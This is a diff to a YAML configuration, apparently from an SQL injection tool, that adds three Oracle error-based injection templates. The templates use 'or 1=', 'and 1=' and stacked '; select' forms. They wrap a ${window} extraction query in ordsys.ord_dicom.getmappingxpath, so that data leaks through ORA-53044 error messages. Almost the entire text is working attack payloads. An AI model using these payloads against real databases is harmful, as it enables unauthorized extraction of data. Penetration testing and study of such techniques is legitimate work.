@@ -281,6 +281,28 @@ strategy:
       )) from dual
      capacity: 481
      
+   - name: Dicom:or
+     query: |
+      /* ORA-53044: invalid tag: <sqli> */
+      or 1=ordsys.ord_dicom.getmappingxpath((
+          ${window}
+      ))
+     capacity: 481
+
+   - name: Dicom:and
+     query: |
+      and 1=ordsys.ord_dicom.getmappingxpath((
+          ${window}
+      ))
+     capacity: 481
+
+   - name: Dicom:stack
+     query: |
+      ; select ordsys.ord_dicom.getmappingxpath((
+          ${window}
+      )) from dual
+     capacity: 481
+
    - name: Sqlhash:or
      query: |
       /* ORA-13797: invalid SQL Id specified, <sqli> */
